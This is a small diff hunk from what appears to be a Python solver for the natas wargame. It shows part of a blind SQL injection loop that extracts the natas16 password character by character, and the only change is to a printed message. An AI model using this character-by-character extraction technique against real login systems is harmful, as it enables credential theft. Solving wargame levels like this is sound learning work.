@@ -33,7 +33,7 @@ def sqli(url, user, password, proxies=None):
             if "This user exists." in response.text:
                 passwd += i
                 sys.stdout.write('\r')
-                sys.stdout.write("[+] The password is: " + passwd)
+                sys.stdout.write("[+] The password of natas16 is: " + passwd)
                 sys.stdout.flush()
                 break
 
